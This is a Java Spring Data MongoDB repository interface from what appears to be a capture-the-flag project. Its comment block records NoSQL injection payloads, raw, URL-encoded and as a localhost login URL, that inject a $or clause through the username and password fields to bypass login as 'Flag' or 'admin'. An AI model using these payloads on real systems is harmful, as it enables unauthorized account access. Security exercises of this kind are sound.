package com.github.marcus99661.ctf;

import java.util.List;

import org.springframework.data.mongodb.repository.MongoRepository;
import org.springframework.data.mongodb.repository.Query;
import org.springframework.data.repository.query.Param;

public interface CustomerRepository extends MongoRepository<Customer, String> {

    public List<Customer> findByName(String name);

    /**
     * Flag', $or: [ { id: {$ne: 1000} }, { asd: 'asd
     * Flag%27%2C+%24or%3A+%5B+%7B+id%3A+%7B%24ne%3A+1000%7D+%7D%2C+%7B+asd%3A+%27asd
     * asd'} ], name : 'Flag
     * asd%27%7D+%5D%2C+name+%3A+%27Flag
     *
     *
     * { '$match':{ 'name': 'Flag', $or: [ { id: {$ne: 1000} }, { asd: 'asd', 'password': 'asd'} ], name : 'Flag'} }
     *
     * http://localhost:8080/login?username=Flag%27%2C+%24or%3A+%5B+%7B+id%3A+%7B%24ne%3A+1000%7D+%7D%2C+%7B+asd%3A+%27asd&password=asd%27%7D+%5D%2C+name+%3A+%27Flag
     * 17:42 19/12/2021
     *
     * username:
     * admin', $or: [ { id: {$ne: 1000} }, { asd: 'asd
     * password:
     * asd'} ], name : 'admin
     *
     * { 'username': 'admin', $or: [ { id: {$ne: 1000} }, { asd: 'asd', 'password': 'asd'} ], name : 'admin'}
     */
}